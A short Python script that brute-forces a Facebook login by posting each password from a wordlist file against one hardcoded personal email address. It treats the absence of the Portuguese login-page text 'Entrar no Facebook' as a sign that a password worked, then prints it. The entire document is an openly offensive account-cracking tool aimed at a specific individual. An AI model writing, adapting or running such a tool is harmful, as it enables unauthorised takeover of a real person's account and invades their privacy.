import requests

url = "https://www.facebook.com"
arq = open('wordlist.txt', 'r')

for line in arq:
    password = line.strip()
    http = requests.post(url, data={
                         'email': 'douglaskjellin@hotmail.com', 'pass': password, 'button': 'submit'})
    content = http.content
    if "Entrar no Facebook" not in str(content):
        print('password cracked: ', password)
        break
    else:
        print('password invalid: ', password)
